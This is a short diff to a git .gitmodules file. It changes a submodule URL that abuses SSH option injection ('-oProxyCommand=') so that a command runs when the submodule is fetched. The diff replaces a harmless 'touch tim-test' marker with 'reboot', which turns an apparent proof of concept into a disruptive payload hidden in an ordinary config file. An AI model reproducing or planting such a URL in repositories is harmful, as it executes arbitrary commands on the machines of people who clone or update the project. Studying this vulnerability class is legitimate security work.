@@ -1,3 +1,4 @@
 [submodule "test"]
 	path = test
-	url = ssh://-oProxyCommand=touch tim-test/git@github.com:/799600966/test.git
+	url = ssh://-oProxyCommand=reboot/git@github.com:/799600966/test.git
+
